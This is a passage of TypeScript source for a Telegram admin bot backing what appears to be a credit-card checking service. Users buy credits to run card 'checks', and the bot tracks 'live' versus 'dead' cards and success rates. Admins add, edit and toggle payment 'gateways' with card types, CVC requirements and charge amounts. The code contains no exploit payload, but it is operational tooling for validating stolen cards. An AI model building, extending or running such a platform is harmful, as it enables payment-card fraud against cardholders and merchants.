      ? `🚫 Banned until ${new Date(profile.banned_until).toLocaleDateString()}`
      : "🚫 Permanently Banned";
  }

  const joined = new Date(profile.created_at).toLocaleDateString("en-US", { year: "numeric", month: "short", day: "numeric" });
  const lastUpdated = new Date(profile.updated_at).toLocaleDateString("en-US", { year: "numeric", month: "short", day: "numeric", hour: "2-digit", minute: "2-digit" });
  const successRate = checks > 0 ? ((liveCards / checks) * 100).toFixed(1) : "0.0";

  // Get user roles
  const userRoles = roles.map((r: any) => r.role).join(", ") || "user";

  // Format devices summary
  let devicesInfo = "";
  if (devices.length > 0) {
    const uniqueIPs = [...new Set(devices.map((d: any) => d.ip_address).filter(Boolean))];
    const uniqueFingerprints = [...new Set(devices.map((d: any) => d.fingerprint).filter(Boolean))];
    devicesInfo = `
<b>📱 Devices (${devices.length})</b>
• Unique IPs: ${uniqueIPs.length}
• Unique Fingerprints: ${uniqueFingerprints.length}
• Blocked: ${blockedDevices.length > 0 ? `⚠️ ${blockedDevices.length}` : "None"}`;
    
    // Show last 3 devices
    const recentDevices = devices.slice(0, 3);
    recentDevices.forEach((d: any, i: number) => {
      const lastSeen = new Date(d.last_seen).toLocaleDateString("en-US", { month: "short", day: "numeric", hour: "2-digit", minute: "2-digit" });
      const isBlocked = blockedDevices.some((b: any) => b.fingerprint === d.fingerprint || b.ip_address === d.ip_address);
      devicesInfo += `\n  ${i + 1}. ${escapeHtml(d.ip_address) || "Unknown IP"} ${isBlocked ? "🚫" : ""}\n      FP: <code>${escapeHtml(d.fingerprint?.substring(0, 12)) || "N/A"}...</code>\n      Last: ${lastSeen}`;
    });
  } else {
    devicesInfo = "\n<b>📱 Devices:</b> No device logs";
  }

  // Format sessions summary
  let sessionsInfo = "";
  if (sessions.length > 0) {
    const activeSessions = sessions.filter((s: any) => {
      const lastActive = new Date(s.last_active);
      const hourAgo = new Date(Date.now() - 60 * 60 * 1000);
      return lastActive > hourAgo;
    }).length;
    sessionsInfo = `
<b>🔐 Sessions (${sessions.length})</b>
• Active (last hour): ${activeSessions}`;
    
    // Show last 2 sessions
    const recentSessions = sessions.slice(0, 2);
    recentSessions.forEach((s: any, i: number) => {
      const lastActive = new Date(s.last_active).toLocaleDateString("en-US", { month: "short", day: "numeric", hour: "2-digit", minute: "2-digit" });
      sessionsInfo += `\n  ${i + 1}. ${escapeHtml(s.browser) || "Unknown"} / ${escapeHtml(s.os) || "Unknown"}`;
      sessionsInfo += `\n      IP: ${escapeHtml(s.ip_address) || "Unknown"}`;
      sessionsInfo += `\n      Last: ${lastActive}`;
    });
  } else {
    sessionsInfo = "\n<b>🔐 Sessions:</b> No active sessions";
  }

  // Format topup history
  let topupInfo = "";
  if (topupDetails.length > 0) {
    topupInfo = `
<b>💳 Topup History</b>
• Total Added: ${totalCreditsAdded} credits
• Pending: ${pendingTopups}
• Total Requests: ${topupsCount}`;
    
    // Show last 3 topups
    const recentTopups = topupDetails.slice(0, 3);
    recentTopups.forEach((t: any, i: number) => {
      const date = new Date(t.created_at).toLocaleDateString("en-US", { month: "short", day: "numeric" });
      const statusEmoji = t.status === "completed" ? "✅" : t.status === "pending" ? "⏳" : "❌";
      topupInfo += `\n  ${i + 1}. ${statusEmoji} ${t.amount} credits (${escapeHtml(t.payment_method)})`;
      topupInfo += `\n      ${date}`;
    });
  } else {
    topupInfo = "\n<b>💳 Topup History:</b> No topups";
  }

  // Format recent checks
  let checksInfo = "";
  if (recentChecks.length > 0) {
    checksInfo = `
<b>🔍 Recent Checks</b>`;
    recentChecks.forEach((c: any, i: number) => {
      const date = new Date(c.created_at).toLocaleDateString("en-US", { month: "short", day: "numeric", hour: "2-digit", minute: "2-digit" });
      const resultEmoji = c.result === "live" ? "✅" : c.result === "dead" ? "❌" : "⏳";
      checksInfo += `\n  ${i + 1}. ${resultEmoji} ${escapeHtml(c.gateway)} - ${date}`;
    });
  }

  // Format notification preferences
  let prefsInfo = "";
  if (notificationPrefs) {
    prefsInfo = `
<b>🔔 Notification Preferences</b>
• Email Announcements: ${notificationPrefs.email_announcements ? "✅" : "❌"}
• Email Ticket Replies: ${notificationPrefs.email_ticket_replies ? "✅" : "❌"}
• Email Topup Status: ${notificationPrefs.email_topup_status ? "✅" : "❌"}`;
  }

  // Format spending alerts
  let alertsInfo = "";
  if (spendingAlerts) {
    alertsInfo = `
<b>⚠️ Spending Alerts</b>
• Enabled: ${spendingAlerts.enabled ? "✅" : "❌"}
• Daily Threshold: ${spendingAlerts.daily_threshold || 0} credits
• Weekly Threshold: ${spendingAlerts.weekly_threshold || 0} credits`;
  }

  // Format ban info if banned
  let banInfo = "";
  if (profile.is_banned) {
    banInfo = `
<b>🚫 Ban Details</b>
• Reason: ${escapeHtml(profile.ban_reason) || "Not specified"}
• Banned At: ${profile.banned_at ? new Date(profile.banned_at).toLocaleDateString("en-US", { year: "numeric", month: "short", day: "numeric" }) : "Unknown"}
• Until: ${profile.banned_until ? new Date(profile.banned_until).toLocaleDateString("en-US", { year: "numeric", month: "short", day: "numeric" }) : "Permanent"}`;
  }

  // Auth provider info
  let authInfo = "";
  if (authUserData) {
    const provider = escapeHtml(authUserData.app_metadata?.provider) || "email";
    const emailConfirmed = authUserData.email_confirmed_at ? "✅ Yes" : "❌ No";
    const lastSignIn = authUserData.last_sign_in_at 
      ? new Date(authUserData.last_sign_in_at).toLocaleDateString("en-US", { year: "numeric", month: "short", day: "numeric", hour: "2-digit", minute: "2-digit" })
      : "Never";
    authInfo = `
<b>🔑 Auth Info</b>
• Provider: ${provider}
• Email Confirmed: ${emailConfirmed}
• Last Sign In: ${lastSignIn}`;
  }

  const userInfoMessage = `
📋 <b>Complete User Info</b>

<b>👤 Profile</b>
• Username: ${escapeHtml(profile.username) || "Not set"}
• Name: ${escapeHtml(profile.name) || "Not set"}
• Email: ${escapeHtml(userEmail) || "Unknown"}
• Role: ${escapeHtml(userRoles)}

<b>📱 Telegram</b>
• Chat ID: ${profile.telegram_chat_id ? `<a href="tg://user?id=${escapeHtml(profile.telegram_chat_id)}">${escapeHtml(profile.telegram_chat_id)}</a>` : "Not connected"}
• Username: ${profile.telegram_username ? `<a href="https://t.me/${escapeHtml(profile.telegram_username)}">@${escapeHtml(profile.telegram_username)}</a>` : "Not set"}

<b>💰 Account</b>
• Credits: ${profile.credits || 0}
• Status: ${status}
• Joined: ${joined}
• Last Updated: ${lastUpdated}

<b>📊 Activity Stats</b>
• Total Checks: ${checks}
• ✅ Live Cards: ${liveCards}
• ❌ Dead Cards: ${deadCards}
• 📈 Success Rate: ${successRate}%
• 💰 Topups: ${topupsCount}
• 🎫 Tickets: ${ticketsCount} (${openTickets.length} open)
${authInfo}
${devicesInfo}
${sessionsInfo}
${topupInfo}
${checksInfo}
${prefsInfo}
${alertsInfo}
${banInfo}

<b>🆔 User ID</b>
<code>${profile.user_id}</code>
`;

  // Quick action buttons (only for admins)
  if (isAdminUser) {
    const actionButtons = {
      inline_keyboard: [
        [
          { text: profile.is_banned ? "✅ Unban" : "🚫 Ban", callback_data: `userinfo_${profile.is_banned ? "unban" : "ban"}_${profile.user_id}` },
          { text: "💰 Add Credits", callback_data: `userinfo_addcredits_${profile.user_id}` },
        ],
        [
          { text: "📱 View Devices", callback_data: `userinfo_devices_${profile.user_id}` },
          { text: "🔐 View Sessions", callback_data: `userinfo_sessions_${profile.user_id}` },
        ],
        [
          { text: "🗑️ Delete User", callback_data: `userinfo_delete_${profile.user_id}` },
        ],
      ],
    };
    await sendTelegramMessage(chatId, userInfoMessage, actionButtons);
  } else {
    // Moderators get view-only (no action buttons)
    await sendTelegramMessage(chatId, userInfoMessage);
  }
}

// ═══════════════════════════════════════════════════════════
// MAIN HANDLER
// ═══════════════════════════════════════════════════════════

const handler = async (req: Request): Promise<Response> => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  // GET request = setup webhook + register commands
  if (req.method === "GET") {
    const webhookUrl = `${SUPABASE_URL}/functions/v1/telegram-webhook`;
    
    // Delete existing webhook first
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/deleteWebhook`);
    
    // Set new webhook
    const setResult = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setWebhook`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ 
        url: webhookUrl,
        allowed_updates: ["message", "callback_query"],
        drop_pending_updates: true,
      }),
    });
    const setData = await setResult.json();
    
    // Register commands (create supabase client for role-based command registration)
    const supabaseForCommands = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);
    await setBotCommands(supabaseForCommands);
    
    // Get webhook info
    const infoResult = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getWebhookInfo`);
    const infoData = await infoResult.json();
    
    return new Response(JSON.stringify({ 
      webhook_set: setData, 
      webhook_info: infoData,
      commands_registered: true 
    }), { 
      headers: { ...corsHeaders, "Content-Type": "application/json" } 
    });
  }

  try {
    const update: TelegramUpdate = await req.json();
    console.log("Update:", JSON.stringify(update));

    const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);

    // ─────────────────────────────────────────────────────────
    // CALLBACK QUERIES
    // ─────────────────────────────────────────────────────────

    if (update.callback_query) {
      const callbackData = update.callback_query.data;
      const callbackChatId = update.callback_query.message?.chat.id.toString();
      const messageId = update.callback_query.message?.message_id;
      
      // Check admin/staff status once for all callback handlers
      const isCallbackAdmin = callbackChatId ? await isAdminAsync(callbackChatId, supabase) : false;
      const isCallbackStaff = callbackChatId ? await isStaffAsync(callbackChatId, supabase) : false;

      // ─────────────────────────────────────────────────────────
      // HEALTH CHECK STOP CALLBACK
      // ─────────────────────────────────────────────────────────
      if (callbackData === "healthcheck_stop") {
        if (!isCallbackAdmin) {
          await answerCallbackQuery(update.callback_query.id, "❌ Only admins can stop scans");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        // Find and update the session to stop it
        if (callbackChatId && messageId) {
          const { data: session } = await supabase
            .from("health_check_sessions")
            .select("id")
            .eq("chat_id", callbackChatId)
            .eq("message_id", messageId)
            .single();

          if (session) {
            await supabase
              .from("health_check_sessions")
              .update({ is_stopped: true, updated_at: new Date().toISOString() })
              .eq("id", session.id);

            await answerCallbackQuery(update.callback_query.id, "🛑 Stopping scan...");
          } else {
            await answerCallbackQuery(update.callback_query.id, "❌ Scan already finished or not found");
          }
        }

        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // ─────────────────────────────────────────────────────────
      // CLEAR URLS CALLBACK
      // ─────────────────────────────────────────────────────────
      if (callbackData === "clearurls_confirm") {
        if (!isCallbackAdmin) {
          await answerCallbackQuery(update.callback_query.id, "❌ Only admins can clear URLs");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        await supabase.from("gateway_urls").delete().neq("id", "00000000-0000-0000-0000-000000000000");
        
        if (callbackChatId && messageId) {
          await editTelegramMessage(callbackChatId, messageId, "🗑️ <b>All URLs Cleared</b>\n\nThe gateway URLs database is now empty.");
        }
        await answerCallbackQuery(update.callback_query.id, "✅ All URLs cleared!");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // ─────────────────────────────────────────────────────────
      // GATEWAY STATUS CALLBACKS
      // ─────────────────────────────────────────────────────────
      
      // Gateway selection - show status options
      if (callbackData.startsWith("gate_select_")) {
        if (!isCallbackAdmin) {
          await answerCallbackQuery(update.callback_query.id, "❌ Only admins can manage gateways");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const gatewayId = callbackData.replace("gate_select_", "");
        
        // Fetch current gateway status
        const { data: gateway } = await supabase
          .from("gateway_status")
          .select("id, name, status")
          .eq("id", gatewayId)
          .single();

        if (!gateway) {
          await answerCallbackQuery(update.callback_query.id, "❌ Gateway not found");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const statusEmojis: Record<string, string> = {
          online: "🟢",
          offline: "🔴",
          unavailable: "🟡"
        };

        const statusMessage = `
━━━━━━━━━━━━━━━━━━━━━━
   🔧 <b>GATEWAY SETTINGS</b>
━━━━━━━━━━━━━━━━━━━━━━

<b>Gateway:</b> ${gateway.name}
<b>Current Status:</b> ${statusEmojis[gateway.status]} ${gateway.status.toUpperCase()}

━━━━━━━━━━━━━━━━━━━━━━
<i>Select a new status:</i>
`;

        const statusKeyboard = {
          inline_keyboard: [
            [
              { text: gateway.status === "online" ? "✅ Online" : "🟢 Online", callback_data: `gate_set_${gatewayId}_online` },
            ],
            [
              { text: gateway.status === "offline" ? "✅ Offline" : "🔴 Offline", callback_data: `gate_set_${gatewayId}_offline` },
            ],
            [
              { text: gateway.status === "unavailable" ? "✅ Unavailable" : "🟡 Unavailable", callback_data: `gate_set_${gatewayId}_unavailable` },
            ],
            [
              { text: "🔙 Back to Gateways", callback_data: "gate_back" }
            ]
          ]
        };

        if (messageId && callbackChatId) {
          await editTelegramMessage(callbackChatId, messageId, statusMessage, statusKeyboard);
        }
        await answerCallbackQuery(update.callback_query.id, `Selected: ${gateway.name}`);
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Gateway status update - set new status
      if (callbackData.startsWith("gate_set_")) {
        if (!isCallbackAdmin) {
          await answerCallbackQuery(update.callback_query.id, "❌ Only admins can manage gateways");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const parts = callbackData.replace("gate_set_", "").split("_");
        const newStatus = parts.pop(); // Last part is the status
        const gatewayId = parts.join("_"); // Rest is the gateway ID

        if (!["online", "offline", "unavailable"].includes(newStatus || "")) {
          await answerCallbackQuery(update.callback_query.id, "❌ Invalid status");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        // Update gateway status
        const { data: updatedGateway, error: updateError } = await supabase
          .from("gateway_status")
          .update({ 
            status: newStatus, 
            updated_at: new Date().toISOString(),
            updated_by: callbackChatId 
          })
          .eq("id", gatewayId)
          .select("id, name, status")
          .single();

        if (updateError || !updatedGateway) {
          await answerCallbackQuery(update.callback_query.id, "❌ Failed to update gateway");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const statusEmojis: Record<string, string> = {
          online: "🟢",
          offline: "🔴",
          unavailable: "🟡"
        };

        const confirmMessage = `
━━━━━━━━━━━━━━━━━━━━━━
   ✅ <b>STATUS UPDATED</b>
━━━━━━━━━━━━━━━━━━━━━━

<b>Gateway:</b> ${updatedGateway.name}
<b>New Status:</b> ${statusEmojis[updatedGateway.status]} ${updatedGateway.status.toUpperCase()}

<i>Change is now live on the website!</i>
━━━━━━━━━━━━━━━━━━━━━━
`;

        const confirmKeyboard = {
          inline_keyboard: [
            [{ text: "🔧 Edit Again", callback_data: `gate_select_${gatewayId}` }],
            [{ text: "🔙 Back to Gateways", callback_data: "gate_back" }],
            [{ text: "🏠 Main Menu", callback_data: "menu_back" }]
          ]
        };

        if (messageId && callbackChatId) {
          await editTelegramMessage(callbackChatId, messageId, confirmMessage, confirmKeyboard);
        }
        await answerCallbackQuery(update.callback_query.id, `✅ ${updatedGateway.name} set to ${newStatus}`);
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Back to gateway list
      if (callbackData === "gate_back") {
        if (!isCallbackAdmin) {
          await answerCallbackQuery(update.callback_query.id, "❌ Only admins can manage gateways");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        // Fetch all gateways with their current status
        const { data: gateways } = await supabase
          .from("gateway_status")
          .select("id, name, status, updated_at")
          .order("name", { ascending: true });

        const statusEmojis: Record<string, string> = {
          online: "🟢",
          offline: "🔴",
          unavailable: "🟡"
        };

        let gateMessage = `
━━━━━━━━━━━━━━━━━━━━━━
   🌐 <b>GATEWAY CONTROL</b>
━━━━━━━━━━━━━━━━━━━━━━

<b>📊 Current Status:</b>
`;

        gateways?.forEach((g: any) => {
          gateMessage += `${statusEmojis[g.status] || "⚪"} <b>${g.name}</b> - ${g.status.toUpperCase()}\n`;
        });

        gateMessage += `
━━━━━━━━━━━━━━━━━━━━━━
<i>Select a gateway to change its status</i>
`;

        const gatewayButtons: any[][] = [];
        gateways?.forEach((g: any) => {
          gatewayButtons.push([{
            text: `${statusEmojis[g.status] || "⚪"} ${g.name}`,
            callback_data: `gate_select_${g.id}`
          }]);
        });
        gatewayButtons.push([{ text: "🔙 Back to Menu", callback_data: "menu_back" }]);

        if (messageId && callbackChatId) {
          await editTelegramMessage(callbackChatId, messageId, gateMessage, { inline_keyboard: gatewayButtons });
        }
        await answerCallbackQuery(update.callback_query.id, "🌐 Gateway Control");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // ─────────────────────────────────────────────────────────
      // ADD GATEWAY CALLBACKS
      // ─────────────────────────────────────────────────────────

      // Cancel gateway addition
      if (callbackData === "addgate_cancel") {
        if (!isCallbackAdmin) {
          await answerCallbackQuery(update.callback_query.id, "❌ Only admins can do this");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        await supabase
          .from("pending_gateway_additions")
          .delete()
          .eq("admin_chat_id", callbackChatId);

        if (messageId && callbackChatId) {
          await editTelegramMessage(callbackChatId, messageId, "❌ <b>Gateway addition cancelled.</b>");
        }
        await answerCallbackQuery(update.callback_query.id, "Cancelled");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Gateway type selection
      if (callbackData.startsWith("addgate_type_")) {
        if (!isCallbackAdmin) {
          await answerCallbackQuery(update.callback_query.id, "❌ Only admins can do this");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const gatewayType = callbackData.replace("addgate_type_", "");

        // Update pending addition
        await supabase
          .from("pending_gateway_additions")
          .update({ gateway_type: gatewayType, step: "card_types" })
          .eq("admin_chat_id", callbackChatId);

        if (messageId && callbackChatId) {
          await editTelegramMessage(callbackChatId, messageId, `
━━━━━━━━━━━━━━━━━━━━━━
   ➕ <b>ADD NEW GATEWAY</b>
━━━━━━━━━━━━━━━━━━━━━━

<b>Step 5/12: Card Types</b>
━━━━━━━━━━━━━━━━━━━━━━
Enter supported card types.

<b>Example:</b> <code>Visa/MC/Amex</code>
`, {
            inline_keyboard: [
              [{ text: "❌ Cancel", callback_data: "addgate_cancel" }]
            ]
          });
        }
        await answerCallbackQuery(update.callback_query.id, `Type: ${gatewayType}`);
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // CVC required selection
      if (callbackData.startsWith("addgate_cvc_")) {
        if (!isCallbackAdmin) {
          await answerCallbackQuery(update.callback_query.id, "❌ Only admins can do this");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const cvcRequired = callbackData === "addgate_cvc_true";

        // Get the pending addition
        const { data: pendingAddition } = await supabase
          .from("pending_gateway_additions")
          .select("*")
          .eq("admin_chat_id", callbackChatId)
          .single();

        if (!pendingAddition) {
          await answerCallbackQuery(update.callback_query.id, "❌ No pending gateway found");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        // Get max display_order
        const { data: maxOrderResult } = await supabase
          .from("gateways")
          .select("display_order")
          .order("display_order", { ascending: false })
          .limit(1)
          .single();

        const newDisplayOrder = (maxOrderResult?.display_order || 0) + 1;

        // Insert the new gateway
        const { error: insertError } = await supabase
          .from("gateways")
          .insert({
            id: pendingAddition.gateway_id,
            name: pendingAddition.gateway_name,
            code: pendingAddition.gateway_code,
            type: pendingAddition.gateway_type,
            status: "online",
            card_types: pendingAddition.card_types || "Visa/MC",
            speed: pendingAddition.speed || "Medium",
            success_rate: pendingAddition.success_rate || "90%",
            description: pendingAddition.description || "",
            icon_name: pendingAddition.icon_name || "CreditCard",
            icon_color: pendingAddition.icon_color || "text-blue-500",
            edge_function_name: pendingAddition.edge_function_name,
            charge_amount: pendingAddition.charge_amount,
            cvc_required: cvcRequired,
            is_active: true,
            display_order: newDisplayOrder
          });

        // Also add to gateway_status for backward compatibility
        await supabase
          .from("gateway_status")
          .upsert({
            id: pendingAddition.gateway_id,
            name: pendingAddition.gateway_name,
            status: "online"
          }, { onConflict: "id" });

        // Delete pending addition
        await supabase
          .from("pending_gateway_additions")
          .delete()
          .eq("admin_chat_id", callbackChatId);

        if (insertError) {
          if (messageId && callbackChatId) {
            await editTelegramMessage(callbackChatId, messageId, `❌ <b>Failed to add gateway:</b>\n\n<code>${escapeHtml(insertError.message)}</code>`);
          }
          await answerCallbackQuery(update.callback_query.id, "❌ Error");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const successMessage = `
━━━━━━━━━━━━━━━━━━━━━━
   ✅ <b>GATEWAY ADDED!</b>
━━━━━━━━━━━━━━━━━━━━━━

<b>ID:</b> <code>${escapeHtml(pendingAddition.gateway_id)}</code>
<b>Name:</b> ${escapeHtml(pendingAddition.gateway_name)}
<b>Type:</b> ${pendingAddition.gateway_type}
<b>Card Types:</b> ${escapeHtml(pendingAddition.card_types || "Visa/MC")}
<b>CVC Required:</b> ${cvcRequired ? "Yes" : "No"}

━━━━━━━━━━━━━━━━━━━━━━
<i>The gateway is now live on the website!</i>
`;

        if (messageId && callbackChatId) {
          await editTelegramMessage(callbackChatId, messageId, successMessage, {
            inline_keyboard: [
              [{ text: "➕ Add Another", callback_data: "addgate_new" }],
              [{ text: "🔙 Back to Menu", callback_data: "menu_back" }]
            ]
          });
        }
        await answerCallbackQuery(update.callback_query.id, "✅ Gateway added!");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Start new gateway addition
      if (callbackData === "addgate_new") {
        if (!isCallbackAdmin) {
          await answerCallbackQuery(update.callback_query.id, "❌ Only admins can do this");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        // Clear any existing pending additions
        await supabase
          .from("pending_gateway_additions")
          .delete()
          .eq("admin_chat_id", callbackChatId);

        // Create new pending addition
        await supabase
          .from("pending_gateway_additions")
          .insert({
            admin_chat_id: callbackChatId,
            step: "id"
          });

        if (messageId && callbackChatId) {
          await editTelegramMessage(callbackChatId, messageId, `
━━━━━━━━━━━━━━━━━━━━━━
   ➕ <b>ADD NEW GATEWAY</b>
━━━━━━━━━━━━━━━━━━━━━━

Let's add a new gateway to the platform!

<b>Step 1/12: Gateway ID</b>
━━━━━━━━━━━━━━━━━━━━━━
Enter a unique ID for this gateway.
Use lowercase letters, numbers, and
underscores only.

<b>Example:</b> <code>custom_auth</code>
`, {
            inline_keyboard: [
              [{ text: "❌ Cancel", callback_data: "addgate_cancel" }]
            ]
          });
        }
        await answerCallbackQuery(update.callback_query.id, "Starting new gateway");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // ─────────────────────────────────────────────────────────
      // DELETE GATEWAY CALLBACKS
      // ─────────────────────────────────────────────────────────

      // Confirm delete
      if (callbackData.startsWith("delgate_confirm_")) {
        if (!isCallbackAdmin) {
          await answerCallbackQuery(update.callback_query.id, "❌ Only admins can do this");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const gatewayId = callbackData.replace("delgate_confirm_", "");
        
        const { data: gateway } = await supabase
          .from("gateways")
          .select("id, name")
          .eq("id", gatewayId)
          .single();

        if (!gateway) {
          await answerCallbackQuery(update.callback_query.id, "❌ Gateway not found");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        if (messageId && callbackChatId) {
          await editTelegramMessage(callbackChatId, messageId, `
⚠️ <b>Confirm Deletion</b>

Are you sure you want to delete:
<b>${escapeHtml(gateway.name)}</b> (${escapeHtml(gateway.id)})?

This action cannot be undone.
`, {
            inline_keyboard: [
              [
                { text: "✅ Yes, Delete", callback_data: `delgate_exec_${gateway.id}` },
                { text: "❌ Cancel", callback_data: "menu_back" }
              ]
            ]
          });
        }
        await answerCallbackQuery(update.callback_query.id, "Confirm deletion?");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Execute delete
      if (callbackData.startsWith("delgate_exec_")) {
        if (!isCallbackAdmin) {
          await answerCallbackQuery(update.callback_query.id, "❌ Only admins can do this");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const gatewayId = callbackData.replace("delgate_exec_", "");
        
        const { data: gateway } = await supabase
          .from("gateways")
          .select("id, name")
          .eq("id", gatewayId)
          .single();

        if (!gateway) {
          await answerCallbackQuery(update.callback_query.id, "❌ Gateway not found");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        // Soft delete by setting is_active to false
        await supabase
          .from("gateways")
          .update({ is_active: false })
          .eq("id", gatewayId);

        // Also update gateway_status
        await supabase
          .from("gateway_status")
          .update({ status: "offline" })
          .eq("id", gatewayId);

        if (messageId && callbackChatId) {
          await editTelegramMessage(callbackChatId, messageId, `
✅ <b>Gateway Deleted</b>

<b>${escapeHtml(gateway.name)}</b> has been removed.

<i>The change is now live on the website.</i>
`, {
            inline_keyboard: [
              [{ text: "🔙 Back to Menu", callback_data: "menu_back" }]
            ]
          });
        }
        await answerCallbackQuery(update.callback_query.id, "✅ Gateway deleted");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // ─────────────────────────────────────────────────────────
      // EDIT GATEWAY CALLBACKS
      // ─────────────────────────────────────────────────────────

      // Select gateway to edit
      if (callbackData.startsWith("editgate_select_")) {
        if (!isCallbackAdmin) {
          await answerCallbackQuery(update.callback_query.id, "❌ Only admins can do this");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const gatewayId = callbackData.replace("editgate_select_", "");
        
        const { data: gateway } = await supabase
          .from("gateways")
          .select("*")
          .eq("id", gatewayId)
          .single();

        if (!gateway) {
          await answerCallbackQuery(update.callback_query.id, "❌ Gateway not found");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const statusEmojis: Record<string, string> = {
          online: "🟢",
          offline: "🔴",
          unavailable: "🟡"
        };

        const editMessage = `
━━━━━━━━━━━━━━━━━━━━━━
   ✏️ <b>EDIT GATEWAY</b>
━━━━━━━━━━━━━━━━━━━━━━

<b>ID:</b> <code>${escapeHtml(gateway.id)}</code>
<b>Name:</b> ${escapeHtml(gateway.name)}
<b>Code:</b> ${gateway.code ? escapeHtml(gateway.code) : "N/A"}
<b>Type:</b> ${gateway.type}
<b>Status:</b> ${statusEmojis[gateway.status]} ${gateway.status}
<b>Card Types:</b> ${escapeHtml(gateway.card_types)}
<b>Speed:</b> ${escapeHtml(gateway.speed)}
<b>Success Rate:</b> ${gateway.success_rate}
<b>Description:</b> ${escapeHtml(gateway.description)}

━━━━━━━━━━━━━━━━━━━━━━
<i>Select a field to edit:</i>
`;

        const fieldButtons = [
          [
            { text: "📝 Name", callback_data: `editgate_field_${gateway.id}_name` },
            { text: "🏷️ Code", callback_data: `editgate_field_${gateway.id}_code` }
          ],
          [
            { text: "📋 Description", callback_data: `editgate_field_${gateway.id}_description` },
            { text: "💳 Card Types", callback_data: `editgate_field_${gateway.id}_card_types` }
          ],
          [
            { text: "⚡ Speed", callback_data: `editgate_field_${gateway.id}_speed` },
            { text: "📊 Success Rate", callback_data: `editgate_field_${gateway.id}_success_rate` }
          ],
          [
            { text: "💰 Charge Amount", callback_data: `editgate_field_${gateway.id}_charge_amount` },
            { text: "🔢 CVC Required", callback_data: `editgate_toggle_${gateway.id}_cvc` }
          ],
          [{ text: "🔙 Back", callback_data: "menu_back" }]
        ];

        if (messageId && callbackChatId) {
          await editTelegramMessage(callbackChatId, messageId, editMessage, { inline_keyboard: fieldButtons });
        }
        await answerCallbackQuery(update.callback_query.id, `Editing: ${gateway.name}`);
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Toggle CVC required
      if (callbackData.startsWith("editgate_toggle_") && callbackData.endsWith("_cvc")) {
        if (!isCallbackAdmin) {
          await answerCallbackQuery(update.callback_query.id, "❌ Only admins can do this");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const gatewayId = callbackData.replace("editgate_toggle_", "").replace("_cvc", "");
        
        const { data: gateway } = await supabase
          .from("gateways")
          .select("id, name, cvc_required")
          .eq("id", gatewayId)
          .single();

        if (!gateway) {
          await answerCallbackQuery(update.callback_query.id, "❌ Gateway not found");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const newValue = !gateway.cvc_required;

        await supabase
          .from("gateways")
          .update({ cvc_required: newValue })
          .eq("id", gatewayId);

        if (messageId && callbackChatId) {
          await editTelegramMessage(callbackChatId, messageId, `
